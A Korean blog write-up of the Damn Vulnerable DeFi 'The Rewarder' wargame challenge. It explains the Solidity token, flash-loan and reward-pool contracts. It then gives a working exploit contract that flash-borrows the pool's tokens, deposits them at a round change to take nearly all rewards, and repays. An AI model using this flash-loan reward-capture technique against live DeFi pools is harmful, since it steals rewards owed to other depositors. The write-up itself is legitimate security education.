---
title: "DamnVulnerableDefi The Rewarder 풀이"
author: Grizzly
categories:
  - Wargame
tags:
  - DamnVulnerableDefi
  - The Rewarder
  - Writeup

sitemap :
changefreq : daily
priority : 1.0
# table of contents
toc: true # 오른쪽 부분에 목차를 자동 생성해준다.
toc_label: "table of content" # toc 이름 설정
toc_icon: "bars" # 아이콘 설정
toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
---

## Overview
기본적으로 DeFi는 암호화폐(코인, 토큰)에 기반한 금융이다.
실제 화폐 경제에서 만들어진 대부분의 서비스가 DeFi 형태로 구현되어 있으며, 이 중에서도 가장 기초인 것은 예금일 것이다.
우리가 은행에 가서 통장을 개설하고, 많든 적든 돈을 예치하면 이자가 발생한다. 
이 또한 DeFi에도 구현이 되어 있으며, 이 문제는 이 예금과 이자에 관한 것이다.

이 문제에서 사용자들은 pool에 토큰을 deposit하고(liquidity 공급), 그 증거로 또 다른 토큰을 받는다. 
그리고 이 토큰의 보유량에 비례하여 5일에 한 번씩 이자를 받는다. 
***공격자는 flash loan을 이용하여 이 이자를 독식하는 것을 목표로 한다.***

## 컨트랙트 분석
이 문제에서는 4개의 스마트 컨트랙트가 사용된다.
문제를 푸는데 중요한 것 위주로 기능을 설명한다.

### AccountingToken

~~~
contract AccountingToken is ERC20Snapshot, AccessControl {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant SNAPSHOT_ROLE = keccak256("SNAPSHOT_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");

    constructor() ERC20("rToken", "rTKN") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
        _setupRole(SNAPSHOT_ROLE, msg.sender);
        _setupRole(BURNER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(MINTER_ROLE, msg.sender), "Forbidden");
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        require(hasRole(BURNER_ROLE, msg.sender), "Forbidden");
        _burn(from, amount);
    }

    function snapshot() external returns (uint256) {
        require(hasRole(SNAPSHOT_ROLE, msg.sender), "Forbidden");
        return _snapshot();
    }

    // Do not need transfer of this token
    function _transfer(address, address, uint256) internal pure override {
        revert("Not implemented");
    }

    // Do not need allowance of this token
    function _approve(address, address, uint256) internal pure override {
        revert("Not implemented");
    }
}
~~~

`AccountingToken`은 사용자가 pool에 유동성(liquidity)를 공급하고(즉, deposit), 그 증거로 받는 토큰을 구현한 컨트랙트이다. 
ERC20 토큰이지만, 모든 기능이 구현되어있지 않고, `mint`와 `burn`만 구현되어 있다.
그리고, 이 동작은 `AccountingToken` 컨트랙트 배포자만 실행할 수 있다.

### RewardToken

~~~
contract RewardToken is ERC20, AccessControl {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() ERC20("Reward Token", "RWT") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(MINTER_ROLE, msg.sender));
        _mint(to, amount);
    }
}
~~~

`RewardToken`은 pool에 유동성을 공급한 사용자에게(즉, `AccountToken`을 가진 사용자)지급하는 이자를 구현한 컨트랙트이다.
역시 ERC20 토큰이지만, `mint`만 구현되어 있다.

### FlashLoanerPool

~~~
contract FlashLoanerPool is ReentrancyGuard {

    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}
~~~

`FlashLoanerPool`은 flash loan 서비스를 제공하는 컨트랙트이다.
현재 컨트랙트의 잔액이 `amount`보다 큰지 확인하고, 사용자에게 대출한 후, 사용자의 `receiveFlashLoan`함수를 호출해서 돌려받는다.
따라서, `flashLoan` 함수를 호출하는 `msg.sender`는 컨트랙트이어야 한다.

### TheRewarderPool.sol

~~~
contract TheRewarderPool {

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;
    
    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");
        
        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if(isNewRewardsRound()) {
            _recordSnapshot();
        }        
        
        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;

            if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;     
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}
~~~

`TheRewarderPool`은 이 문제의 핵심이 되는 컨트랙트이다.
이 컨트랙트는 DeFi에서 흔히 말하는 liquidity pool에 해당한다.
여러 기능을 제공하기 때문에 중요한 역할을 하는 함수만 살펴본다.

- `deposit(uint256)`: 사용자가 pool에 토큰을 예치하기 위해 사용되는 함수이다. 사용자는 `amountToDeposit`만큼 `liquidity token`을 예치하고, 같은 양 만큼 `account token`을 받는다. 그리고, 라운드가 돌아왔다면 이자인 `reward token`도 받는다.
- `withdraw(uint256)`: 사용자가 pool에서 토큰을 출급하기 위해 사용되는 함수이다. 사용자는 예치했던 잔액에서 `amountToWithdraw` 만큼 출금하고 `account token`을 소각한다.
- `distributeRewards()`: pool에 예치한 사용자에게 이자인 `reward token`을 전달하기 위한 함수이다. `reward token`은 `account token`의 총 발행량과 사용자가 가진 `account token` 양의 비율로 결정된다. 예를 들어, 총 400개의 `account token`을 발향됐는데, 사용자가 100개의 `account token`을 가지고 있다면, `reward token`은 25개가 된다. `reward token`은 항상 발급되는 것이 아니라, 5일에 한번씩 지급된다. 

## Solution

컨트랙트에 대한 설명은 여기까지 하고, 문제를 풀어보자.
앞서 간략하게 문제의 목표를 설명했지만, exploit 코드를 보며 조금 더 자세하게 살펴보자.

### 컨트랙트 배포

~~~
before(async function () {
    [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
    users = [alice, bob, charlie, david];
    ...
    await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL); // 1000000 ether
    ...
    // Alice, Bob, Charlie and David deposit 100 tokens each
    for (let i = 0; i < users.length; i++) {
        const amount = ethers.utils.parseEther('100');
        await this.liquidityToken.transfer(users[i].address, amount);
        await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
        await this.rewarderPool.connect(users[i]).deposit(amount);
        expect(
            await this.accountingToken.balanceOf(users[i].address)
        ).to.be.eq(amount);
    }
    expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
    expect(await this.rewardToken.totalSupply()).to.be.eq('0');

    // Advance time 5 days so that depositors can get rewards
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
    
    // Each depositor gets 25 reward tokens
    for (let i = 0; i < users.length; i++) {
        await this.rewarderPool.connect(users[i]).distributeRewards();
        expect(
            await this.rewardToken.balanceOf(users[i].address)
        ).to.be.eq(ethers.utils.parseEther('25'));
    }
    expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

    // Attacker starts with zero DVT tokens in balance
    expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    
    // Two rounds should have occurred so far
    expect(
        await this.rewarderPool.roundNumber()
    ).to.be.eq('2');
}
~~~

문제의 셋업부터 꽤 복잡한데, 하나씩 해석해보면 다음과 같다.

- `flashLoanerPool`은 `liquidity token` 1,000,000개를 가진다.
- 4명의 사용자(Alice, Bob, Charlie, David)가 `rewarderPool`에 `liquidity token`을 각자 100개씩 예치하고,`account token`을 100개씩 받는다. 
- 5일이 경과한다.
- 4명의 사용자는 각자 `reward token`을 25개씩 받는다. 따라서, 현재 `reward token`의 총 발행량은 100개 이다.
- attacker는 `liquidity token`이 없다.
- `rewarderPool`는 현재 2라운드 상태이다.

### 익스플로잇 후 조건

~~~
after(async function () {
    // Only one round should have taken place
    expect(
        await this.rewarderPool.roundNumber()
    ).to.be.eq('3');

    // Users should get neglegible rewards this round
    for (let i = 0; i < users.length; i++) {
        await this.rewarderPool.connect(users[i]).distributeRewards();
        let rewards = await this.rewardToken.balanceOf(users[i].address);
        
        // The difference between current and previous rewards balance should be lower than 0.01 tokens
        let delta = rewards.sub(ethers.utils.parseEther('25'));
        console.log("rewards: " + rewards);
        console.log("delta: " + delta);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
    }
    
    // Rewards must have been issued to the attacker account
    expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
    let rewards = await this.rewardToken.balanceOf(attacker.address);

    // The amount of rewards earned should be really close to 100 tokens
    let delta = ethers.utils.parseEther('100').sub(rewards);
    expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

    // Attacker finishes with zero DVT tokens in balance
    expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
}
~~~

위 초기 상태에서 어떤 익스플로잇을 실행해서 다음의 조건을 만족시켜야 한다.

- `rewarderPool`은 3 라운드 상태이어야 한다.
- 4명의 사용자가 또 다시 `reward token`을 받았는데, 이번에는 0.01 토큰보다 작게 받아야 한다.
- `rewarderPool`의 `reward token` 총 발행량은 100보다 커야 한다.
- attacker가 수신한 `reward token`은 100개 정도여야 한다.
- attacker가 소유한 `liquidity token`은 0 이어야 한다.

### 익스플로잇
일단 문제 풀이 조건에서 `rewarderPool`이 3라운드에 진입해야 하기 때문에 익스플로잇 단계에서 5일이 경과해야 함을 알 수 있다.
물론 실제로 5일을 기다릴 수 없기 때문에 컨트랙트 셋업 단계에서 사용됐던 Hardhat 함수를 사용한다.

attacker는 `liquidity token`을 가지고 있지 않기 때문에 `flash loan`을 이용해야 함을 알 수 있다. 또한 `flash loan` 서비스를 이용하기 위해서는 attacker가 컨트랙트를 작성해야 한다.

4명의 사용자는 `reward token`을 굉장히 조금 받는데 비해 attacker는 많은 `reward token`을 받아야 한다.
앞서 `reward token`의 개수는 `account token`의 총 발행량 대비 `msg.sender`가 가지고 있는 `account token`의 비율이기 때문에 가장 많이 받을 수 있는 `reward token`은 100개이다. 즉, 문제에서 attacker가 소유한 `reward token`의 양이 100개에 가까워야 한다는 조건은 attacker가 대부분의 `account token`을 소유해야함을 의미한다.
또한 `account token`은 `liquidity token`에 대해 1:1 비율로 지급되기 때문에 `rewaderPool`에서 사용자가 공급한 liquidity의 비율이 매우 높아야 한다.

위 사실을 종합하면 아래와 같은 익스플로잇 시나리오를 생각해볼 수 있다.

1. 먼저 문제 셋업 단계에서 강제로 5일이 경과되게 한다. `rewarderPool`은 3 라운드에 진입한다.
2. attacker가 익스플로잇 컨트랙트를 배포하여 `flash loan` 서비스를 호출한다. 이때, `flashloanerPool`이 가진 모든 토큰을 대출한다.
3. 익스플로잇 컨트랙트는 빌린 `liquidity token`을 모두 `rewarderPool`에 deposit한다. 이때, 예치한 `liquidity token`의 수 만큼 `account token`을 받는다. 다른 4명의 사용자는 각자 `liquidity token`을 100개씩 예치했기 때문에 pool 내에서 attacker(정확히는 익스플로잇 컨트랙트)가 차지하는 비율이 엄청나게 높아진다. 이미 5일이 경과했기 때문에 `deposit()` 함수가 실행되는 중 `distributeRewards()` 함수가 호출되어 익스플로잇 컨트랙트에 100개에 가까운 `reward token`이 지급된다.
4. 익스플로잇 컨트랙트는 예치했던 `liquidity token`을 다시 출금해서 `flashloanerPool`로 반환한다.
5. attacker는 익스플로잇 컨트랙트가 가진 `reward token`을 가져온다.

위 시나리오를 구현한 익스플로잇 컨트랙트는 다음과 같다.
~~~
contract RewarderAttackContract {
    DamnValuableToken public liquidityToken;
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoan;
    RewardToken public rewardToken;

    constructor(
        address liquidityTokenAddress, 
        address rewarderPoolAddress,
        address flashLoanPoolAddress,
        address rewardTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        flashLoan = FlashLoanerPool(flashLoanPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);

        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoan), amount);
    }

    function runAttack(uint256 amount) public {
        flashLoan.flashLoan(amount);

        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
~~~

## 마치며
오랜만에 워게임을 풀다보니, 감이 상당히 떨어졌다. 코드를 해석하는 데에도 시간이 많이 걸렸고, 무엇보다 `approve`와 `transferFrom`과 같은 함수의 동작이 기억이 안나서 다시 찾아봐야했다.
그리고, 그렇게 난이도가 있는 문제는 아니라고 생각되지만, 이전에 풀었던 문제에 비해 코드가 많아 지나보니 조금 압도됐던 것 같다. 

이번 문제가 주는 교훈을 꽤 중요하다고 생각된다. 많은 사람들이 새로운 DeFi 서비스가 런칭되면, 재빨리 달려가서 엄청난 liquidity를 공급하는데, 바로 이런 이유일 것이다. liquidity가 충분하지 않은 서비스의 초기 단계에서는 성숙한 서비스에 비해 개인이 많은 지분을 차지할 수 있기 때문이다. 그리고 DeFi의 특성한 이러한 지분은 결국 돈이 되기 때문에 DeFi 서비스를 설계하는 사람이라면 충분히 고려해야 하는 상황일 것이다. 여기에서는 `deposit` 함수 내에 `reward token`을 지급하는 함수가 있는 것이 가장 큰 문제일 것이다.